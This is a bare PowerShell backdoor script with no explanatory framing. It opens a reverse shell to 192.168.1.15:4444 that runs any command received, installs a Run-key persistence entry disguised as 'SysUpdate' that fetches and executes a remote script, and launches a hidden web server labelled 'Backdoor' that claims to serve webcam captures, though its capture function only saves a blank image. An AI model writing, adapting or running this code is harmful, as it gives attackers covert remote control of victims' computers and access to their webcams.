$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);

$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.1.15/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

$webcamScript = @"
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

function Capture-Webcam {
 $webcam = New-Object System.Drawing.Bitmap(640, 480)
 $graphics = [System.Drawing.Graphics]::FromImage($webcam)
 $webcamStream = New-Object System.IO.MemoryStream
 $webcam.Save($webcamStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 $webcamStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
 $webcamBytes = $webcamStream.ToArray()
 return $webcamBytes
}

function Start-HTTPServer {
 $l = New-Object System.Net.HttpListener
 $l.Prefixes.Add('http://*:8080/')
 $l.Start()

 while ($l.IsListening) {
 $c = $l.GetContext()
 if ($c.Request.Url.AbsolutePath -eq '/screen') {
 $webcamBytes = Capture-Webcam
 $c.Response.ContentType = 'image/jpeg'
 $c.Response.ContentLength64 = $webcamBytes.Length
 $c.Response.OutputStream.Write($webcamBytes, 0, $webcamBytes.Length)
 } else {
 $h = '<h1>Backdoor</h1><a href=/screen>Screen</a>'
 $b = [Text.Encoding]::UTF8.GetBytes($h)
 $c.Response.ContentType = 'text/html'
 $c.Response.ContentLength64 = $b.Length
 $c.Response.OutputStream.Write($b, 0, $b.Length)
 }
 $c.Response.Close()
 }
}

Start-HTTPServer
"@

Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop","-c",$webcamScript

while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
 $d = [text.encoding]::ASCII.GetString($b_arr,0, $i)
 try {
 $sb = (Invoke-Expression $d 2>&1 | Out-String)
 } catch {
 $sb = $_.Exception.Message
 }
 $out = $sb + "PS " + (pwd).Path + "> "
 $m = ([text.encoding]::ASCII).GetBytes($out)
 $s.Write($m,0,$m.Length)
 $s.Flush()
}
$c.Close()
